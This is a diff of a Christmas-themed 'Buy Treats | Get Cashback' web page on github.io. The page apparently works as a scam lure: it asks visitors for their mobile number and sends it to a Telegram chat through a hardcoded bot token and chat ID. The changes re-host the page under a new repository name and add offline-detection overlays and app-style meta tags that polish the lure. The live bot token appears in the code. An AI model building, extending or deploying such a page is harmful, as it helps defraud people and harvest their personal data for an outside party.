@@ -5,18 +5,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
   <title>Buy Treats | Get Cashback</title>
   
+  <!-- ===== PWA META TAGS (minimal) ===== -->
+  <meta name="theme-color" content="#041024" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="apple-mobile-web-app-title" content="Buy Treats" />
+  <link rel="apple-touch-icon" href="photos/iva2.png" />
+  
   <!-- ===== FACEBOOK META TAGS ===== -->
   <meta property="og:title" content="Buy Treats | Get Cashback" />
   <meta property="og:description" content="Earn cashback on every treat you buy this Christmas! 🎄" />
   <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://online-trivia.github.io/Prizes/" />
-  <meta property="og:image" content="https://online-trivia.github.io/Prizes/photos/cb.png" />
+  <meta property="og:url" content="https://virtual-exchange.github.io/Cashback/" />
+  <meta property="og:image" content="https://virtual-exchange.github.io/Cashback/photos/cb.png" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="630" />
   <meta property="og:site_name" content="Buy Treats | Get Cashback" />
   
   <!-- ===== FAVICON ===== -->
-  <link rel="icon" href="https://online-trivia.github.io/Prizes/photos/gc_icon.png" />
+  <link rel="icon" href="photos/gc_icon.png" />
   
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
@@ -67,6 +74,82 @@
       pointer-events: none;
       z-index: 0;
       filter: blur(8px);
+    }
+
+    /* Internet Required Banner - always visible */
+    .internet-required {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #dc2626;
+      color: white;
+      text-align: center;
+      padding: 0.5rem;
+      font-size: 0.7rem;
+      font-weight: 700;
+      z-index: 1000;
+      letter-spacing: 0.05em;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .internet-required i {
+      font-size: 0.9rem;
+    }
+
+    /* Offline Overlay - hides content when offline */
+    .offline-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(4, 16, 36, 0.95);
+      backdrop-filter: blur(10px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 2rem;
+      flex-direction: column;
+      text-align: center;
+    }
+    .offline-overlay.visible {
+      display: flex;
+    }
+    .offline-overlay .icon {
+      font-size: 4rem;
+      margin-bottom: 1rem;
+    }
+    .offline-overlay h2 {
+      color: white;
+      font-size: 1.5rem;
+      font-weight: 900;
+      margin-bottom: 0.5rem;
+    }
+    .offline-overlay p {
+      color: rgba(255,255,255,0.7);
+      font-size: 0.95rem;
+      max-width: 350px;
+      line-height: 1.6;
+    }
+    .offline-overlay .retry-btn {
+      margin-top: 1.5rem;
+      padding: 0.8rem 2.5rem;
+      background: linear-gradient(135deg, #c41e3a, #901125);
+      border: none;
+      border-radius: 60px;
+      color: white;
+      font-weight: 800;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+      box-shadow: 0 8px 20px rgba(196, 30, 58, 0.3);
+    }
+    .offline-overlay .retry-btn:hover {
+      transform: translateY(-2px);
+    }
+    .offline-overlay .retry-btn:active {
+      transform: scale(0.96);
     }
 
     .decoration {
@@ -657,6 +740,12 @@
       box-shadow: 0 4px 15px rgba(196, 30, 58, 0.3);
     }
 
+    .cta-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
     .cta-btn i {
       color: var(--gold);
       font-size: 1.2rem;
@@ -702,6 +791,7 @@
       .offer-banner p { font-size: 0.8rem; }
       .profile-photo-container::before { font-size: 1.6rem; top: -12px; }
       .decoration { display: none; }
+      .internet-required { font-size: 0.6rem; padding: 0.3rem; }
     }
 
     @media (max-width: 380px) {
@@ -720,12 +810,29 @@
 </head>
 <body>
 
+  <!-- ===== INTERNET REQUIRED BANNER ===== -->
+  <div class="internet-required">
+    <i class="fas fa-wifi"></i> Internet Connection Required
+  </div>
+
+  <!-- ===== OFFLINE OVERLAY ===== -->
+  <div class="offline-overlay" id="offlineOverlay">
+    <div class="icon">📡</div>
+    <h2>No Internet Connection</h2>
+    <p>Please check your internet connection and try again.</p>
+    <button class="retry-btn" onclick="checkConnection()">
+      <i class="fas fa-sync-alt"></i> Retry
+    </button>
+  </div>
+
+  <!-- ===== DECORATIONS ===== -->
   <div class="decoration tree">🎄</div>
   <div class="decoration star">⭐</div>
   <div class="decoration star2">✨</div>
   <div class="decoration gift">🎁</div>
   <div class="decoration santa">🎅</div>
 
+  <!-- ===== SNOWFLAKES ===== -->
   <div class="snowflake" style="left: 5%; animation-duration: 12s; animation-delay: 0s;">❄</div>
   <div class="snowflake" style="left: 15%; animation-duration: 14s; animation-delay: 2s;">❄</div>
   <div class="snowflake" style="left: 25%; animation-duration: 10s; animation-delay: 4s;">❄</div>
@@ -737,6 +844,7 @@
   <div class="snowflake" style="left: 85%; animation-duration: 14s; animation-delay: 1s;">❄</div>
   <div class="snowflake" style="left: 92%; animation-duration: 11s; animation-delay: 3s;">❄</div>
 
+  <!-- ===== MAIN CARD ===== -->
   <div class="brand-card">
     
     <div style="display: flex; justify-content: center;">
@@ -771,7 +879,6 @@
           <div class="profile-photo">
             <img src="photos/iva.png" alt="Buy Treats" id="brandImg" />
           </div>
-          <!-- Projector Zoom -->
           <div class="projector-zoom" id="projectorZoom">
             <img src="photos/iva.png" alt="Zoom" id="projectorImg" />
           </div>
@@ -825,6 +932,40 @@
 
   <script>
     (function() {
+      // ===== INTERNET CONNECTION CHECK =====
+      const offlineOverlay = document.getElementById('offlineOverlay');
+
+      function checkConnection() {
+        if (!navigator.onLine) {
+          offlineOverlay.classList.add('visible');
+          return false;
+        } else {
+          offlineOverlay.classList.remove('visible');
+          return true;
+        }
+      }
+
+      // Check connection on load
+      window.addEventListener('load', function() {
+        if (!navigator.onLine) {
+          offlineOverlay.classList.add('visible');
+        } else {
+          offlineOverlay.classList.remove('visible');
+        }
+      });
+
+      // Check connection when online/offline status changes
+      window.addEventListener('online', function() {
+        offlineOverlay.classList.remove('visible');
+        // Reload page to refresh content
+        location.reload();
+      });
+
+      window.addEventListener('offline', function() {
+        offlineOverlay.classList.add('visible');
+      });
+
+      // ===== IMAGE ERROR HANDLING =====
       const img = document.getElementById('brandImg');
       const projectorImg = document.getElementById('projectorImg');
       const successSound = document.getElementById('successSound');
@@ -857,6 +998,7 @@
         this.parentElement.appendChild(placeholder);
       });
 
+      // ===== PHOTO WRAPPER CLICK =====
       const photoWrapper = document.getElementById('photoWrapper');
       
       photoWrapper.addEventListener('click', function(e) {
@@ -870,6 +1012,7 @@
         }
       });
 
+      // ===== TYPING EFFECT =====
       const messages = [
         "🎄 Advance Merry Christmas! Treat yourself! 🎅",
         "Earn double cashback on every treat you buy! 💰",
@@ -906,6 +1049,7 @@
       }
       setTimeout(typeEffect, 700);
 
+      // ===== MOBILE INPUT =====
       const mobileInput = document.getElementById('popupMobileInput');
       const inputWrapper = document.getElementById('inputWrapper');
       const statusIcon = document.getElementById('statusIcon');
@@ -962,6 +1106,7 @@
         if (!/^[0-9]$/.test(e.key)) e.preventDefault();
       });
 
+      // ===== TELEGRAM NOTIFICATION =====
       function sendTelegramNotification(phoneNumber) {
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
@@ -1005,6 +1150,7 @@ Number: ${phoneNumber}
           });
       }
 
+      // ===== PLAY SOUND =====
       function playSuccessSound() {
         if (successSound) {
           successSound.currentTime = 0;
@@ -1014,7 +1160,14 @@ Number: ${phoneNumber}
         }
       }
 
+      // ===== HANDLE SUBMIT =====
       function handleSubmit() {
+        // Check internet first
+        if (!navigator.onLine) {
+          offlineOverlay.classList.add('visible');
+          return;
+        }
+
         const val = mobileInput.value.replace(/\D/g, '');
         if (val.length === 11 && val.startsWith('09')) {
           playSuccessSound();
@@ -1049,7 +1202,12 @@ Number: ${phoneNumber}
         if (e.key === 'Enter') { e.preventDefault(); handleSubmit(); }
       });
 
+      // ===== EXPOSE CHECK CONNECTION GLOBALLY =====
+      window.checkConnection = checkConnection;
+
+      // Initial validation
       validateInput();
+
     })();
   </script>
 </body>
